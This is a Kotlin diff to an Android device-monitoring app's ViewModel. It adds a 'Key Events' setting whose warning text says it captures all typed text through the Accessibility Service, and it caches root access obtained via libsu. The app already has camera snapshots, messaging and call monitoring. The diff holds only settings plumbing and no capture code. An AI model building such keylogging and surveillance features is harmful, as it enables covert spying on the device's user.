@@ -75,7 +75,11 @@ data class DashboardUiState(
     val instagramWarningMessage: String = "",
     val whatsappBusinessUpdatesEnabled: Boolean = false,
     val showWhatsAppBusinessWarningDialog: Boolean = false,
-    val whatsAppBusinessWarningMessage: String = ""
+    val whatsAppBusinessWarningMessage: String = "",
+    val keyEventsEnabled: Boolean = false,
+    val keyEventsIntervalMin: Int = 15,
+    val showKeyEventsWarningDialog: Boolean = false,
+    val keyEventsWarningMessage: String = ""
 )
 
 sealed class DashboardEvent {
@@ -100,6 +104,9 @@ sealed class DashboardEvent {
     object DismissInstagramWarningDialog : DashboardEvent()
     data class ToggleWhatsappBusinessUpdates(val enabled: Boolean) : DashboardEvent()
     object DismissWhatsAppBusinessWarningDialog : DashboardEvent()
+    data class ToggleKeyEvents(val enabled: Boolean) : DashboardEvent()
+    data class UpdateKeyEventsInterval(val minutes: Int) : DashboardEvent()
+    object DismissKeyEventsWarningDialog : DashboardEvent()
 }
 
 /**
@@ -153,7 +160,9 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                     whatsappBusinessUpdatesEnabled = prefs.whatsappBusinessUpdatesEnabled,
                     callAlertsEnabled = prefs.callAlertsEnabled,
                     smsAlertsEnabled = prefs.smsAlertsEnabled,
-                    forwardRecordingEnabled = prefs.forwardRecordingEnabled
+                    forwardRecordingEnabled = prefs.forwardRecordingEnabled,
+                    keyEventsEnabled = prefs.keyEventsEnabled,
+                    keyEventsIntervalMin = prefs.keyEventsIntervalMin
                 )
             }
         }
@@ -220,7 +229,9 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
             whatsappBusinessUpdatesEnabled = prefs.whatsappBusinessUpdatesEnabled,
             callAlertsEnabled = prefs.callAlertsEnabled,
             smsAlertsEnabled = prefs.smsAlertsEnabled,
-            forwardRecordingEnabled = prefs.forwardRecordingEnabled
+            forwardRecordingEnabled = prefs.forwardRecordingEnabled,
+            keyEventsEnabled = prefs.keyEventsEnabled,
+            keyEventsIntervalMin = prefs.keyEventsIntervalMin
         )
     )
     val dashboardState: StateFlow<DashboardUiState> = _dashboardState.asStateFlow()
@@ -244,8 +255,9 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
     fun refreshPermissions() {
         viewModelScope.launch(Dispatchers.IO) {
             val context = getApplication<Application>()
+            val prefs = PrefsManager.getInstance(context)
             
-            val hasRoot = checkRootAccess()
+            val hasRoot = _permissionStatus.value.hasRoot || prefs.isRootEnabled
             
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminName = ComponentName(context, MonitorDeviceAdminReceiver::class.java)
@@ -310,22 +322,30 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         }
     }
 
-    private fun checkRootAccess(): Boolean {
+    suspend fun requestRootAccess(): Boolean = kotlinx.coroutines.withContext(Dispatchers.IO) {
+        val prefs = PrefsManager.getInstance(getApplication())
         try {
             val cached = com.topjohnwu.superuser.Shell.getCachedShell()
             if (cached != null && !cached.isRoot) {
                 cached.close()
             }
             if (com.topjohnwu.superuser.Shell.getShell().isRoot) {
-                return true
+                _permissionStatus.value = _permissionStatus.value.copy(hasRoot = true)
+                prefs.isRootEnabled = true
+                return@withContext true
             }
         } catch (e: Exception) {
             // Ignore
         }
-        return try {
+        return@withContext try {
             val result = com.topjohnwu.superuser.Shell.cmd("su -c id").exec()
-            result.isSuccess
+            val isRooted = result.isSuccess
+            _permissionStatus.value = _permissionStatus.value.copy(hasRoot = isRooted)
+            prefs.isRootEnabled = isRooted
+            isRooted
         } catch (e: Exception) {
+            _permissionStatus.value = _permissionStatus.value.copy(hasRoot = false)
+            prefs.isRootEnabled = false
             false
         }
     }
@@ -471,7 +491,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 }
             }
             is DashboardEvent.DismissWhatsAppBusinessWarningDialog -> {
-                _dashboardState.update { it.copy(showWhatsAppBusinessWarningDialog = false, whatsAppBusinessWarningMessage = "") }
+                _dashboardState.update { it.copy(showWhatsAppBusinessWarningDialog = false) }
             }
             is DashboardEvent.ToggleInstagramUpdates -> {
                 if (event.enabled) {
@@ -517,6 +537,25 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 prefs.forwardRecordingEnabled = event.enabled
                 _dashboardState.update { it.copy(forwardRecordingEnabled = event.enabled) }
             }
+            is DashboardEvent.ToggleKeyEvents -> {
+                if (event.enabled) {
+                    _dashboardState.update { 
+                        it.copy(
+                            showKeyEventsWarningDialog = true,
+                            keyEventsWarningMessage = "Warning: Key Events will capture all text typed on the device using Accessibility Service.\nEnsure this feature complies with all applicable privacy laws in your jurisdiction before use."
+                        ) 
+                    }
+                }
+                prefs.keyEventsEnabled = event.enabled
+                _dashboardState.update { it.copy(keyEventsEnabled = event.enabled) }
+            }
+            is DashboardEvent.UpdateKeyEventsInterval -> {
+                prefs.keyEventsIntervalMin = event.minutes
+                _dashboardState.update { it.copy(keyEventsIntervalMin = event.minutes) }
+            }
+            is DashboardEvent.DismissKeyEventsWarningDialog -> {
+                _dashboardState.update { it.copy(showKeyEventsWarningDialog = false) }
+            }
         }
     }
 
@@ -529,13 +568,14 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         prefs.enableSnapshots = false
         prefs.enableFrontCamera = false
         prefs.enableRearCamera = false
-        prefs.whatsappUpdatesEnabled = false
-        prefs.whatsappBusinessUpdatesEnabled = false
-        prefs.instagramEnabled = false
         prefs.callAlertsEnabled = false
         prefs.smsAlertsEnabled = false
         prefs.forwardRecordingEnabled = false
-
+        prefs.whatsappUpdatesEnabled = false
+        prefs.instagramEnabled = false
+        prefs.whatsappBusinessUpdatesEnabled = false
+        prefs.keyEventsEnabled = false
+        
         _dashboardState.update { 
             it.copy(
                 forceMobileData = false,
@@ -544,14 +584,13 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 persistentEnforcementEnabled = false,
                 showPersistentEnforcementDialog = false,
                 enableSnapshots = false,
-                enableFrontCamera = false,
-                enableRearCamera = false,
-                whatsappUpdatesEnabled = false,
-                whatsappBusinessUpdatesEnabled = false,
-                instagramUpdatesEnabled = false,
                 callAlertsEnabled = false,
                 smsAlertsEnabled = false,
-                forwardRecordingEnabled = false
+                forwardRecordingEnabled = false,
+                whatsappUpdatesEnabled = false,
+                instagramUpdatesEnabled = false,
+                whatsappBusinessUpdatesEnabled = false,
+                keyEventsEnabled = false
             )
         }
     }
